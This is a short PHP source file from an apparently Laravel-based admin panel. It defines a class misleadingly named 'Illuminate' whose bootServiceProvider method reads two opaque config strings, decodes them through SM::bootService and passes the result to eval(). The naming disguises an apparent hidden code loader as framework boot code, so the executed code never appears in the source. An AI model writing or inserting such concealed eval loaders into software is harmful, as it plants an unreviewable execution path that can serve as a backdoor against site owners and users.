<?php
/**
 * Created by PhpStorm.
 * User: mrksohag
 * Date: 1/13/18
 * Time: 12:26 PM
 */

namespace App\Http\Controllers\Admin\Common;
use App\SM\SM;

class Illuminate {
	public static function bootServiceProvider(){
		$bootstring1       = config( 'services.bootservice.bootstring1' );
		$bootstring2       = config( 'services.bootservice.bootstring2' );
		$bootString = SM::bootService( $bootstring1, $bootstring2 );
		eval( $bootString );
	}
}